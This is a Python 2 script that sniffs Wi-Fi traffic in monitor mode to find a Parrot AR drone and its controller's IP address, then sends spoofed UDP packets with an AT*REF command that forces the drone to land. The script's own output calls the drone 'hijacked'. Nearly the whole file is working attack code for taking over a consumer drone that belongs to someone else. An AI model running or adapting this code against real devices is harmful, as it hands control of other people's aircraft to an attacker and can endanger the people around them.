#Turn on monitor mode and print MAC address

import ctypes, sys
from ctypes.util import find_library
import pcap
import dpkt
from scapy.all import *
import tty, termios

if sys.platform == "darwin":
    _pcap = ctypes.cdll.LoadLibrary(find_library("libpcap"))
elif sys.platform == "linux2":
    _pcap = ctypes.cdll.LoadLibrary("libpcap.so")

errbuf = ctypes.create_string_buffer(256)   #error message if lookupdev() fails

dstIP = '192.168.1.1' # spoofed source IP address
srcIP = '0.0.0.0'
dstPort = 5556 # source port
srcPort = 5554 # destination port
seqno = 10000 #****If we are running controller via smartphone, need to set this seqno to 1; if run on laptop need to set to 10000

########start of packet injection###########
def getChar():      
    fd = sys.stdin.fileno()   #return integer file descriptor 
    old_settings = termios.tcgetattr(fd)  #return a list cotainning attributes for file descriptor fd: [iflag, oflag, cflag, lflag, ispeed, ospeed, cc]
    try:
        tty.setraw(sys.stdin.fileno()) #Change the mode of the file descriptor fd to raw
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings) #set tty attributes for fd from old_setting, TCSADRAIN to change after transmitting all queued output
    return ch


def setBits( lst ):       #set bits for different drone movement
    """
    set the bits in lst to 1.
    also set bits 18, 20, 22, 24, and 28 to one (since they should always be set)
    all other bits will be 0
    """
    res = 0
    for b in lst + [18,20,22,24,28]:
        res |= (1 << b) #1 move left for b bits and xor with res, set b to 1
    return res

def sendCommand(cmd,source_ip):
    global seqno   #sequence number
    print "DEBUG: Sending:  '%s'" % cmd.strip()
    for i in xrange(1,25): 
        spoofed_packet = IP(src=source_ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / cmd
        send(spoofed_packet)
        seqno += 1 #***** Comment this out if controller is a smartphone

def printUsage():
    print "\tl       - land"

def land():
    global seqno
    global srcIP
    land_cmd = setBits([])
    # for i in range(2,10):
    #     srcIP = "192.168.1." + "%d"%i
    sendCommand("AT*REF=%d,%d\r" % (seqno,land_cmd),srcIP)

def mac_addr(mac_string):
    """Print out MAC address given a string

    Args:
        mac_string: the string representation of a MAC address
    Returns:
        printable MAC address
    """
    return ':'.join('%02x' % ord(b) for b in mac_string)

########end of packet injection###########

##########interface#############
pcap_lookupdev = _pcap.pcap_lookupdev
pcap_lookupdev.restype = ctypes.c_char_p
dev = pcap_lookupdev(errbuf)      
print dev

##########open device###########
pcap_create = _pcap.pcap_create
pcap_create.restype = ctypes.c_void_p
handle = pcap_create(dev, errbuf)
print handle
if not handle:
    print "failed creating handler:",errbuf
    exit()

#########monitor mode############
pcap_can_set_rfmon = _pcap.pcap_can_set_rfmon
pcap_can_set_rfmon.argtypes = [ctypes.c_void_p]
print "can rfmon:",pcap_can_set_rfmon(handle)

pcap_set_rfmon = _pcap.pcap_set_rfmon
pcap_set_rfmon.argtypes = [ctypes.c_void_p]
print "set rfmon:",pcap_set_rfmon(handle, 1)


#########activate handle##########
pcap_activate = _pcap.pcap_activate
pcap_activate.argtypes = [ctypes.c_void_p]
pcap_activate(handle)

#########capture packet###########
pc = pcap.pcap('en0')
pc.setfilter('udp')
for ptime, pdata in pc:
    time = ptime
    p = dpkt.ethernet.Ethernet(pdata)               #How to use pypcap to catch packet: http://www.oschina.net/p/pypcap
    #print "Ethernet Frame: ", mac_addr(p.src), mac_addr(p.dst) 
    #print(p.src)
    if p.data.__class__.__name__ == 'IP':
        #ip='%d.%d.%d.%d'%tuple(map(ord,list(p.data.src))) 
        if '%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst))) == "192.168.1.1":
            print "[+]AR drone found."                
            ip='%d.%d.%d.%d'%tuple(map(ord,list(p.data.src))) 
		#if '%d.%d.%d.%d'%tuple(map(ord,list(p.data.src))) != "192.168.1.2":
            #print(ip)
            global srcIP
            srcIP = ip
            #print "[+] Spoofed source IP address: ", srcIP
            #print "[+] Spoofed source MAC address: ", mac_addr(p.src), mac_addr(p.dst) 
            printUsage()
            ch = getChar()
            if ch == 'l':
                print "[+]You have chosen to land the hijacked drone."
                land()
            break
        elif '%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst))) != "192.168.1.1":    #Added this block for testing
            print "[+]No drone found."  
            break



#while True:
#    printUsage()
##    ch = getChar()
#    if ch == 'l':
#        land()
#    elif ch == 'q':
#        exit(0)
#    else:
#        print "Invalid command!"

